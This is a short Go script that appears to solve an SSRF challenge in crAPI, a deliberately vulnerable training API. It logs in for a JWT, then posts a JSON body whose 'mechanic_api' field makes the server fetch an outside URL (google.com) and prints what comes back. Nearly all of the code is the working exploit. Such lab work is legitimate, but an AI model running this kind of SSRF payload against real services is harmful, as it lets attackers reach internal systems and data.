package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

func main() {
	config, err := configurator.GetConfig("../challenge-automation/config.yaml")
	if err != nil {
		log.Fatalln(err)
	}

	loginurl := fmt.Sprintf("%s%s", config.Hostname, config.LoginURL)
	token := configurator.GetJWTToken(loginurl, config.Email, config.Password)

	url := fmt.Sprintf("%s%s", config.Hostname, config.TargetURL)

	SSRF(token, url)
}

func SSRF(token, target_url string) {
	payload := map[string]interface{}{
		"mechanic_code":            "TRAC_JHN",
		"problem_details":          "test problem",
		"vin":                      "5OUCN24JOCO495860",
		"mechanic_api":             "https://www.google.com",
		"repeat_request_if_failed": false,
		"number_of_repeats":        1,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Fatalln(err)
	}

	request, err := http.NewRequest("POST", target_url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Println(err)
	}
	request = configurator.ConfigureRequest(request, token)
	request.Header.Add("Content-Type", "application/json")

	response, err := configurator.CustomHttpClient().Do(request)
	if err != nil {
		log.Fatalln(err)
	}

	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		log.Fatalln("Error reading response body:", err)
	}

	fmt.Println("Request to other website on behalf of crapi (SSRF):")
	fmt.Println(string(responseBody))
}
